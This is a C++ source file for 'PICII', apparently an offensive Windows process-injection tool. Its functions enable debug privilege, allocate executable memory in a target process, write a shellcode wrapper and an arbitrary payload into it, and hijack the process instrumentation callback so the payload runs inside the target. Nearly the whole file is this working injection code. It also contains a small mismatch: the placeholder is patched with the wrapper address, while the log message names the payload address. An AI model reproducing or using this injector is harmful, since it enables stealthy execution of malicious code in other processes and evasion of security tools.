#include "syringe.hpp"
#include "../wrapper/bin/wrapper.hpp"
#include <winternl.h>
#include <iostream>

LPVOID payloadBaseAddr;
LPVOID wrapperBaseAddr;

#define _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION 40

bool enableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp = {};
    
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return true;
}

bool allocateMemory(HANDLE handle, size_t size){
    wrapperBaseAddr = VirtualAllocEx(handle, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!wrapperBaseAddr) return 0;

    payloadBaseAddr = VirtualAllocEx(handle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!payloadBaseAddr) return 0;

    return true;
}

bool writeMemory(HANDLE handle, unsigned char* payload, unsigned int lenght){
    bool writeWrapper = WriteProcessMemory(handle, wrapperBaseAddr, bin_wrapper_bin, bin_wrapper_bin_len, 0);
    bool writeMemory = WriteProcessMemory(handle, payloadBaseAddr, payload, lenght, 0);
    if(!writeMemory || !writeWrapper) return 0;
    return true;
}

int replacePlaceHolder(){
    BYTE pattern[] = { 0x48, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE };

    for(int i = 0; i < bin_wrapper_bin_len - 10; i++){
        if(memcmp(&bin_wrapper_bin[i], pattern, 10) == 0){
            memcpy(&bin_wrapper_bin[i + 2], &wrapperBaseAddr, 8);
            return i;
        }
    }

    return -1;
}

bool setProcessCallback(HANDLE handle){
    fnNtSetInformationProcess_t NtSetInformationProcess = (fnNtSetInformationProcess_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");

    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION PICI;
    PICI.Version = 0;
    PICI.Reserved = 0;
    PICI.Callback = wrapperBaseAddr;
    NTSTATUS status = NtSetInformationProcess(handle, _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, &PICI, sizeof(PICI));

    if(!NT_SUCCESS(status)) return 0;
    return true;
}

bool PICII::inject(HANDLE handle, size_t size, unsigned char* payload, unsigned int lenght, bool debug){
    if(!enableDebugPrivilege()) return 0;
    if(debug) std::cout << "[PICII] enabled se debug privilege" << std::endl;

    if(!allocateMemory(handle, size)) return 0;
    if(debug) std::cout << "[PICII] wrapper memory allocated at " << std::hex << wrapperBaseAddr << std::endl;
    if(debug) std::cout << "[PICII] payload memory allocated at " << std::hex << payloadBaseAddr << std::endl;

    int pos = replacePlaceHolder();
    if(pos == -1) return 0;
    if(debug) std::cout << "[PICII] placeholder found at pos: " << pos << std::endl;
    if(debug) std::cout << "[PICII] placeholder replaced with: " << std::hex << payloadBaseAddr << std::endl;
    
    if(!writeMemory(handle, payload, lenght)) return 0;
    if(debug) std::cout << "[PICII] memory written" << std::endl;

    if(!setProcessCallback(handle)) return 0;
    if(debug) std::cout << "[PICII] process instrumentation callback information set" << std::endl;\

    return true;
}

bool PICII::exit(HANDLE handle, bool debug){
    fnNtSetInformationProcess_t NtSetInformationProcess = (fnNtSetInformationProcess_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");

    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION PICI;
    PICI.Reserved = 0;
    PICI.Version = 0;
    PICI.Callback = NULL;
    NtSetInformationProcess(handle, _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, &PICI, sizeof(PICI));

    if(!VirtualFreeEx(handle, payloadBaseAddr, 0, MEM_RELEASE)) return 0;
    if(debug) std::cout << "[PICII] released memory" << std::endl;
    return true;
}